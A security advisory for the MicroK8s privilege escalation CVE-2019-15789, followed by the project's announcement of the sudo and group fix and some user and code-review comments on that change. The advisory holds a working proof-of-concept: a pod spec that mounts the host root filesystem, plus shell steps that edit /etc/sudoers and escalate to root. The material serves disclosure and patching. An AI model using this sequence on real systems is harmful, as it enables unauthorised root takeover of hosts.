MicroK8s prior to v1.15.3 included a privilege escalation vulnerability, allowing a low privilege user to obtain root access to the host. MicroK8s allowed any user with access to the host to deploy a pod to the underlying Kubernetes installation. This allowed an attacker with local access to provision a privileged container and gain root access to the underlying host.

**Date Released:** 10/09/2019

**Author:** Denis Andzakovic

**Project Website:** <https://microk8s.io/>

**Affected Software:** MicroK8s <= v1.15.2

**CVE**: CVE-2019-15789

## Proof-of-Concept Exploit

As low privileged users were allowed to configure the running cluster and containers therein, a malicious user could spawn a pod with complete access to the root file system, edit `/etc/sudoers` and escalate to root.

```
doi@microk8:~$ cat pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: hostmount
spec:
  containers:
  - name: shell
    image: ubuntu:latest
    command:
      - "bin/bash"
      - "-c"
      - "sleep 10000"
    volumeMounts:
      - name: root
        mountPath: /opt/root
  volumes:
  - name: root
    hostPath:
      path: /
      type: Directory
doi@microk8:~$ microk8s.kubectl apply -f pod.yaml
pod/hostmount created
doi@microk8:~$ microk8s.kubectl exec -it hostmount /bin/bash
root@hostmount:/# cd /opt/
root@hostmount:/opt# cd root/
root@hostmount:/opt/root# ls
bin   dev  home        initrd.img.old  lib64       media  opt   root  sbin  srv       sys  usr  vmlinuz
boot  etc  initrd.img  lib             lost+found  mnt    proc  run   snap  swap.img  tmp  var  vmlinuz.old
root@hostmount:/opt/root# cd etc/
root@hostmount:/opt/root/etc# sed -i 's/ALL$/NOPASSWD: ALL/g' sudoers
root@hostmount:/opt/root/etc# cat sudoers
{...snip...}
# User privilege specification
root    ALL=(ALL:ALL) NOPASSWD: ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) NOPASSWD: ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) NOPASSWD: ALL
{...snip...}
root@hostmount:/opt/root/etc# exit
exit
doi@microk8:~$ sudo su -
root@microk8:~# id
uid=0(root) gid=0(root) groups=0(root)

```

The above could also be trivially achieved with a privileged container, though MicroK8s disables privileged containers by default. Note: privileged containers are enabled when Istio is installed.

## Patch

The MicroK8s team addressed this vulnerability in v1.15.3 by requiring any access to the Kubernetes installation to be performed by a privileged user (eg, through sudo or by adding the user to the microk8s group).

## Timeline

12/06/2019 - Advisory sent to Ubuntu security mailing list.

14/06/2019 - Advisory receipt acknowledged.

16/07/2019 - Update requested.

17/07/2019 - Report confirmed by the Ubuntu team.

15/08/2019 - Update requested.

15/08/2019 - Ubuntu referenced an open pull request, introducing the a requirement for all MicroK8s actions to be performed via sudo.

06/09/2019 - v1.15.3 snap added to stable.

10/09/2019 - Advisory released.

With the upcoming v1.15.3 release, MicroK8s commands will require the use of sudo whenever elevated privileges are needed. For example, `microk8s.kubectl` by default authenticates you as a Kubernetes administrator and will therefore be restricted to sudo users only.

This change was made to improve the overall security of MicroK8s. Authors of scripts that use `microk8s.` commands may wish to test their scripts with an updated MicroK8s build . The `edge` channel already contains these changes; give them a try with:

```
sudo snap install microk8s --classic --edge

```

For more information on MicroK8s consult the official [docs](https://microk8s.io/docs/), and to contribute to the project, check out the repo at <https://github.com/ubuntu/microk8s>, or chat with us on the [Kubernetes Slack](http://slack.kubernetes.io/), in the [#microk8s](https://discuss.kubernetes.io/tags/microk8s) channel.

**[UPDATE ]**

Based on the feedback we got from the community we introduced a linux user group called “microk8s”. Users of this group are able to access MicroK8s with no restrictions (no need for sudo). Add your user to the group with:

```
sudo usermod -a -G microk8s $USER

```

Thank you

This is cool and working as expected. But then why is it asking for sudo password when I enable the dashboard? `microk8s.enable dashboard`

It does not attaches itself to any restricted port, so I don’t see the need

This is because the dashboard addon also enables the metrics server, to get the cluster metrics such as cpu and memory.

The metrics server addon adds the `authentication-token-webhook` options in the apiserver. Followed by a restart of the apiserver.

Restarting the apiserver needs sudo permission.

* etcd listens non port 12379 and accessed through certificates.

Strictly speaking this name is a bit misleading - might be better to call it `exit_if_no_permission` perhaps?

Should this be abstracted out to a separate function in microk8s-resources/actions/common/utils.sh?

Can I please keep this? I like this oneliner better than creating a function. I know it is in a couple of places but it is a singe call to grep.

| Having to type sudo for every command including microk8s.kubectl is getting a bit annoying.  ``` $ microk8s.kubectl  You do not have enough permissions to access MicroK8s. Please try again with sudo.  ```  Is there a way to use microk8s without sudo, aka how it worked before this was merged? |

| [@ktsakalozos](https://github.com/ktsakalozos) I thought we had discussed using an approach similar to lxd / libvirt, where the certificates etc would be group readable to a new `microk8s` group and so a user could add themselves to that group so they could then use microk8s without having to use sudo? |

Just to double-check, moving this socket from the filesystem to all available IP addresses is intentional, correct?

If the umask allows creating this file with read mode for all users, then there is a race condition between this line and the next line that untrusted processes on the system may be able to win. It's better to set a restrictive umode before creating files.
